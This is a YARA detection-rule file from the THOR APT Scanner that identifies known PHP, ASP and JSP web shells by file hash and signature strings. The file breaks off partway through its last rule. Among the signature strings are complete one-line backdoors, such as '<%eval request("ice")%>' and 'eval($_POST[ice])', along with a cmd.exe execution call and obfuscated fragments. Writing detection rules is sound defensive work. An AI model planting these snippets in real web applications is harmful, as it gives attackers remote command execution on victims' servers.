/*

   THOR APT Scanner - Web Shells Extract
   This rulset is a subset of all hack tool rules included in our
   APT Scanner THOR - the full featured APT scanner

   Florian Roth
   BSK Consulting GmbH

   revision: 20160115

    License: Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)
    Copyright and related rights waived via https://creativecommons.org/licenses/by-nc-sa/4.0/

*/

rule Weevely_Webshell {
    meta:
        id = "1Fpiu4Lwd5ndPh8zJ2UXg7"
        fingerprint = "v1_sha256_f034f1258cdc1c4ebcaa482283da1df166423f547131e57cca9074e0830574aa"
        version = "1.0"
        score = 60
        date = "2014/12/14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Weevely Webshell - Generic Rule - heavily scrambled tiny web shell"
        category = "INFO"
        reference = "http://www.ehacking.net/2014/12/weevely-php-stealth-web-backdoor-kali.html"

    strings:
        $php = "<?php" ascii
        $s0 = /\$[a-z]{4} = \$[a-z]{4}\("[a-z][a-z]?",[\s]?"",[\s]?"/ ascii
        $s1 = /\$[a-z]{4} = str_replace\("[a-z][a-z]?","","/ ascii
        $s2 = /\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\)\)\); \$[a-z]{4}\(\);/ ascii
        $s4 = /\$[a-z]{4}="[a-zA-Z0-9]{70}/ ascii
    condition:
        $php at 0 and all of ($s*) and filesize > 570 and filesize < 800
}

rule webshell_h4ntu_shell_powered_by_tsoi_ {
    meta:
        id = "4nHb9NsBToHWds0ZDPmjpm"
        fingerprint = "v1_sha256_2f3cfb6d7d5ee6facb18397e3166ab2a7450f05a24fbb25a159a6168ca631a39"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file h4ntu shell [powered by tsoi].php"
        category = "INFO"
        hash = "06ed0b2398f8096f1bebf092d0526137"

    strings:
        $s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
        $s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
        $s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
        $s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($"
    condition:
        all of them
}
rule webshell_PHP_sql {
    meta:
        id = "6Ym1zkyft6E7Nt1knB2QoG"
        fingerprint = "v1_sha256_83049c3c5bce88d239b59accb173e234c3169f59187de17b7e6c2a0aa58a552f"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file sql.php"
        category = "INFO"
        hash = "2cf20a207695bbc2311a998d1d795c35"

    strings:
        $s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
        $s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
    condition:
        all of them
}
rule webshell_PHP_a {
    meta:
        id = "2ahLBClRrv18GNFCD35fFJ"
        fingerprint = "v1_sha256_6bdd5fbe9b16f2d84b884239cf3b6453587933c6b0c4308508d10019b4f36e38"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file a.php"
        category = "INFO"
        hash = "e3b461f7464d81f5022419d87315a90d"

    strings:
        $s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
        $s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
        $s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword
    condition:
        2 of them
}
rule webshell_iMHaPFtp_2 {
    meta:
        id = "FlhFZT1ALuXzWvqa3IvDh"
        fingerprint = "v1_sha256_9099504870c1e466808060f11aea38472832846d24e3c84fdd69b7d26bfed69d"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file iMHaPFtp.php"
        category = "INFO"
        hash = "12911b73bc6a5d313b494102abcf5c57"

    strings:
        $s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($"
        $s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA"
    condition:
        1 of them
}
rule webshell_Jspspyweb {
    meta:
        id = "5fBljg1tnRctNEBwSwPlju"
        fingerprint = "v1_sha256_491d9c4efee27469f2a26f6fcb7f7c768eac60977e640096ea5f78ff346e7fbe"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Jspspyweb.jsp"
        category = "INFO"
        hash = "4e9be07e95fff820a9299f3fb4ace059"

    strings:
        $s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7"
        $s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control"
    condition:
        all of them
}
rule webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2 {
    meta:
        id = "5ffImqbPRUBczkFLp9YU8D"
        fingerprint = "v1_sha256_d3d27d80f5f3adbc050a59d0c25953ec5d634344b5d051a4abdf4eeed3b8b035"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
        category = "INFO"
        hash = "49ad9117c96419c35987aaa7e2230f63"

    strings:
        $s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n"
        $s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color"
    condition:
        1 of them
}
rule webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend {
    meta:
        id = "54uSKGQGAY76oytAuKDoOv"
        fingerprint = "v1_sha256_fc553942b06b305f7b0d5b072a8d4517b0e51229545440ea9c43e9be01d64efa"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
        category = "INFO"
        hash = "089ff24d978aeff2b4b2869f0c7d38a3"

    strings:
        $s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo"
        $s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
    condition:
        1 of them
}
rule webshell_phpshell_2_1_pwhash {
    meta:
        id = "3FivKBhAuTu9afIbDM8o6C"
        fingerprint = "v1_sha256_616c0570550cdb9394b5675864d4eec3fa62390f880817406b2a3b63952b69f0"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file pwhash.php"
        category = "INFO"
        hash = "ba120abac165a5a30044428fac1970d8"

    strings:
        $s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi"
        $s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\","
    condition:
        1 of them
}
rule webshell_PHPRemoteView {
    meta:
        id = "2rxMIrQp52Yoz7b9WhQyQ"
        fingerprint = "v1_sha256_2de48b8640c0f2089a4a0badb4429127cb61ac972459290041e20b959e4e0c05"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file PHPRemoteView.php"
        category = "INFO"
        hash = "29420106d9a81553ef0d1ca72b9934d9"

    strings:
        $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
        $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
    condition:
        1 of them
}
rule webshell_jsp_12302 {
    meta:
        id = "6uVQECptDclR1PNS3LtnO3"
        fingerprint = "v1_sha256_0959a138abc791f17344e25e84b24888ddfe238981fc7e3ffd76c0390006ea46"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 12302.jsp"
        category = "INFO"
        hash = "a3930518ea57d899457a62f372205f7f"

    strings:
        $s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
        $s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
        $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
    condition:
        all of them
}
rule webshell_caidao_shell_guo {
    meta:
        id = "1ijgMww9vLqG60nVPksIwc"
        fingerprint = "v1_sha256_efb7055f42dd6be41ea3983cacea1a70b83675c8ebcb88ae3b250066a29e94eb"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file guo.php"
        category = "INFO"
        hash = "9e69a8f499c660ee0b4796af14dc08f0"

    strings:
        $s0 = "<?php ($www= $_POST['ice'])!"
        $s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww"
    condition:
        1 of them
}
rule webshell_PHP_redcod {
    meta:
        id = "5OaciTgPCThcnj8RN8fSVg"
        fingerprint = "v1_sha256_eddfd90d27793756bcc685ffe33b2dabc3bb28b9654c33a0f99359e8b6f13678"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file redcod.php"
        category = "INFO"
        hash = "5c1c8120d82f46ff9d813fbe3354bac5"

    strings:
        $s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
        $s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword
    condition:
        all of them
}
rule webshell_remview_fix {
    meta:
        id = "4cN9whg56loW1LLFmHqz41"
        fingerprint = "v1_sha256_0b29ef74fb0786aefe99281360dc4fe27005eac345a36bc14259afa6fc555303"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file remview_fix.php"
        category = "INFO"
        hash = "a24b7c492f5f00e2a19b0fa2eb9c3697"

    strings:
        $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
        $s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"
    condition:
        1 of them
}
rule webshell_asp_cmd {
    meta:
        id = "6BEy3MDBcUOF736knnb0RH"
        fingerprint = "v1_sha256_8e72b54267c2f83b288cdd43ccd56ae4ab1f95c17f4dde077e637d951df54866"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cmd.asp"
        category = "INFO"
        hash = "895ca846858c315a3ff8daa7c55b3119"

    strings:
        $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
        $s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
        $s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
    condition:
        1 of them
}
rule webshell_php_sh_server {
    meta:
        id = "11Cq7Mo5KqaMxFr9CGlDNb"
        fingerprint = "v1_sha256_9f4d940a381e7bd298a252f485d5f1d26fd191c27f6e86e8fa6028237592a8c3"
        version = "1.0"
        score = 50
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file server.php"
        category = "INFO"
        hash = "d87b019e74064aa90e2bb143e5e16cfa"

    strings:
        $s0 = "eval(getenv('HTTP_CODE'));" fullword
    condition:
        all of them
}
rule webshell_PH_Vayv_PH_Vayv {
    meta:
        id = "7Y7cz8LGtczyxijhtBzwzO"
        fingerprint = "v1_sha256_8769400b7b6828849f27092d790d291721c7e1b39dfd2080de5da8e59dd25523"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file PH Vayv.php"
        category = "INFO"
        hash = "35fb37f3c806718545d97c6559abd262"

    strings:
        $s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
        $s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"
    condition:
        1 of them
}
rule webshell_caidao_shell_ice {
    meta:
        id = "1meLX6nCYEGYfotNe8FGQ2"
        fingerprint = "v1_sha256_d92cc9ac8630b40f23b9ff7cda5a237b4885d30de4b9b497be7512e7eb020a09"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file ice.asp"
        category = "INFO"
        hash = "6560b436d3d3bb75e2ef3f032151d139"

    strings:
        $s0 = "<%eval request(\"ice\")%>" fullword
    condition:
        all of them
}
rule webshell_cihshell_fix {
    meta:
        id = "1IIDqBrOhrbMYjN630lSpC"
        fingerprint = "v1_sha256_59ae76d6828d8c0ddcbafa19063e6dcf25c826386f46df2b8f9674b628365a2b"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cihshell_fix.php"
        category = "INFO"
        hash = "3823ac218032549b86ee7c26f10c4cb5"

    strings:
        $s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty"
        $s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos"
    condition:
        1 of them
}
rule webshell_asp_shell {
    meta:
        id = "6EpRCTTgbvECDhoogorCnX"
        fingerprint = "v1_sha256_5cc698e4ff23ca296b339589d12c24e67c99272e73445604a4552d3023e19636"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file shell.asp"
        category = "INFO"
        hash = "e63f5a96570e1faf4c7b8ca6df750237"

    strings:
        $s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
        $s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
    condition:
        all of them
}
rule webshell_Private_i3lue {
    meta:
        id = "64NLATGKm4QWU7GFGI66WI"
        fingerprint = "v1_sha256_274586f2c451eda45c3a52b615961dbba806f8d25e34cc358e661fcfd1143d08"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Private-i3lue.php"
        category = "INFO"
        hash = "13f5c7a035ecce5f9f380967cf9d4e92"

    strings:
        $s8 = "case 15: $image .= \"\\21\\0\\"
    condition:
        all of them
}
rule webshell_php_up {
    meta:
        id = "4UskcBBEI4Fije7ZOj3L0n"
        fingerprint = "v1_sha256_22f444ce4068f46c0b57e566faca0c6377346e403de592b0e51869781fda31a9"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file up.php"
        category = "INFO"
        hash = "7edefb8bd0876c41906f4b39b52cd0ef"

    strings:
        $s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
        $s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
        $s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword
    condition:
        2 of them
}
rule webshell_Mysql_interface_v1_0 {
    meta:
        id = "6KP2iG8Hy018phvrEAe2P5"
        fingerprint = "v1_sha256_baa938c4cfd2c46b1752d866e186d76a04c353617d8ec3e0d78a3c546b120d13"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Mysql interface v1.0.php"
        category = "INFO"
        hash = "a12fc0a3d31e2f89727b9678148cd487"

    strings:
        $s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"
    condition:
        all of them
}
rule webshell_php_s_u {
    meta:
        id = "193X15gmq4OrMwlvMLEDve"
        fingerprint = "v1_sha256_3c6904fa475784e737275fd47eabea077bed57e920071c68fa09f7defecbdb72"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file s-u.php"
        category = "INFO"
        hash = "efc7ba1a4023bcf40f5e912f1dd85b5a"

    strings:
        $s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"
    condition:
        all of them
}
rule webshell_phpshell_2_1_config {
    meta:
        id = "2s7AzMgIGRcRDYMOngEzoP"
        fingerprint = "v1_sha256_51d16bcaef5f6795ebcd1154dca79d5cf5a389948b0e59f4939c30fef877e816"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file config.php"
        category = "INFO"
        hash = "bd83144a649c5cc21ac41b505a36a8f3"

    strings:
        $s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
    condition:
        all of them
}
rule webshell_asp_EFSO_2 {
    meta:
        id = "7GA7322WUefkXgjfzbCwmF"
        fingerprint = "v1_sha256_19bd00fabe0b4695129c180dd145e757e0b2c2a6dad751e8c889222c191e03ce"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file EFSO_2.asp"
        category = "INFO"
        hash = "a341270f9ebd01320a7490c12cb2e64c"

    strings:
        $s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"
    condition:
        all of them
}
rule webshell_jsp_up {
    meta:
        id = "1juK61ivFzXI8Nxje7RVgq"
        fingerprint = "v1_sha256_77c8121d000c45e44717689dec535fde7c9722005d1e4ff40d0b84abcf289f47"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file up.jsp"
        category = "INFO"
        hash = "515a5dd86fe48f673b72422cccf5a585"

    strings:
        $s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
    condition:
        all of them
}
rule webshell_NetworkFileManagerPHP {
    meta:
        id = "4F1Ek5rUu7xN5xS8SUMjb"
        fingerprint = "v1_sha256_235e4062a9b9ebdf7dd0b8a2cb3b16ba7688a75b90d8c527344cf9605304838d"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file NetworkFileManagerPHP.php"
        category = "INFO"
        hash = "acdbba993a5a4186fd864c5e4ea0ba4f"

    strings:
        $s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "
    condition:
        all of them
}
rule webshell_Server_Variables {
    meta:
        id = "mIosA0awiPBY0JFpsgaXy"
        fingerprint = "v1_sha256_2a85301f1d6e4c457ff0a1b2a08eb6f054905993a0667087f37b9a7352e38911"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Server Variables.asp"
        category = "INFO"
        hash = "47fb8a647e441488b30f92b4d39003d7"

    strings:
        $s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
        $s9 = "Variable Name</B></font></p>" fullword
    condition:
        all of them
}
rule webshell_caidao_shell_ice_2 {
    meta:
        id = "1OCBx6wnyFGN0xZkOmVhCS"
        fingerprint = "v1_sha256_57c3c369abd826d676290300d8df2d890b777fa1f0e1156654062159a4228db7"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file ice.php"
        category = "INFO"
        hash = "1d6335247f58e0a5b03e17977888f5f2"

    strings:
        $s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
    condition:
        all of them
}
rule webshell_caidao_shell_mdb {
    meta:
        id = "55DSqDNY52TDUq7wOj7anY"
        fingerprint = "v1_sha256_89f7692acd754992f9379b9b4661a01d6ab95cb85a3c2699928aa5ed3a3ac8c5"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file mdb.asp"
        category = "INFO"
        hash = "fbf3847acef4844f3a0d04230f6b9ff9"

    strings:
        $s1 = "<% execute request(\"ice\")%>a " fullword
    condition:
        all of them
}
rule webshell_jsp_guige {
    meta:
        id = "5ijDjI0DPQnxX50lmncdba"
        fingerprint = "v1_sha256_9d71095b5c709dfdd8b5fcebcaa4493d9c93e841e85cda2e2255e0c15ea83659"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file guige.jsp"
        category = "INFO"
        hash = "2c9f2dafa06332957127e2c713aacdd2"

    strings:
        $s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"
    condition:
        all of them
}
rule webshell_phpspy2010 {
    meta:
        id = "79dQAzvF0vf76WkOZX2Lmx"
        fingerprint = "v1_sha256_b3acef196b30cf9afe24c81860bedff69fc5652c514aa36aba85d16b12bcc432"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file phpspy2010.php"
        category = "INFO"
        hash = "14ae0e4f5349924a5047fed9f3b105c5"

    strings:
        $s3 = "eval(gzinflate(base64_decode("
        $s5 = "//angel" fullword
        $s8 = "$admin['cookiedomain'] = '';" fullword
    condition:
        all of them
}
rule webshell_asp_ice {
    meta:
        id = "6cwtQEjlfFyfqTfHpdRoyP"
        fingerprint = "v1_sha256_524419e802d3cb6ac310565af22ec28044984aa4b1b2ee1cfbd292afd071709c"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file ice.asp"
        category = "INFO"
        hash = "d141e011a92f48da72728c35f1934a2b"

    strings:
        $s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"
    condition:
        all of them
}
rule webshell_drag_system {
    meta:
        id = "4dhYHGQr4iaBA104sTTiax"
        fingerprint = "v1_sha256_8ea8d9d64521f47f1396e4f4d6c8f4a71fa1a643799ec408e1d2e0f255dc4996"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file system.jsp"
        category = "INFO"
        hash = "15ae237cf395fb24cf12bff141fb3f7c"

    strings:
        $s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"
    condition:
        all of them
}
rule webshell_DarkBlade1_3_asp_indexx {
    meta:
        id = "4HnBCrSk7e3d4L61VcJd2b"
        fingerprint = "v1_sha256_57cfe09d53d42ee9d909a3894b8a3362209c1972c7d96ae5fdc61681c2998a89"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file indexx.asp"
        category = "INFO"
        hash = "b7f46693648f534c2ca78e3f21685707"

    strings:
        $s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"
    condition:
        all of them
}
rule webshell_phpshell3 {
    meta:
        id = "2iM72shTP7CGawrwg8SEYK"
        fingerprint = "v1_sha256_868b1b69fab3ec6fcfa15557075f313f4af0ec9cd15f41bb9dcc9bc26fc17f93"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file phpshell3.php"
        category = "INFO"
        hash = "76117b2ee4a7ac06832d50b2d04070b8"

    strings:
        $s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
        $s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
        $s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
    condition:
        2 of them
}
rule webshell_jsp_hsxa {
    meta:
        id = "2SMnqzTs9vg1OUUZOwRs8O"
        fingerprint = "v1_sha256_7f79b66d87f638bc09ee576de4dc4a8c5b1da7c406d318eeff7a4221c35d2313"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file hsxa.jsp"
        category = "INFO"
        hash = "d0e05f9c9b8e0b3fa11f57d9ab800380"

    strings:
        $s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
    condition:
        all of them
}
rule webshell_jsp_utils {
    meta:
        id = "20M3mxpqNwGvUPRlY4YRpA"
        fingerprint = "v1_sha256_90a5b64e59306bdffc5a89f5d86a2dc7a17669021d863e2a5ecea13d65c19053"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file utils.jsp"
        category = "INFO"
        hash = "9827ba2e8329075358b8e8a53e20d545"

    strings:
        $s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
        $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
    condition:
        all of them
}
rule webshell_asp_01 {
    meta:
        id = "GhhUBXkiFEXrEj4U89zKG"
        fingerprint = "v1_sha256_e057800013a9a8f4c3ecbe4e27c14e904700548e6ad9dc1f00313c7a3de7fd2d"
        version = "1.0"
        score = 50
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 01.asp"
        category = "INFO"
        hash = "61a687b0bea0ef97224c7bd2df118b87"

    strings:
        $s0 = "<%eval request(\"pass\")%>" fullword
    condition:
        all of them
}
rule webshell_asp_404 {
    meta:
        id = "KYdjvH93NApbwx8sA6D84"
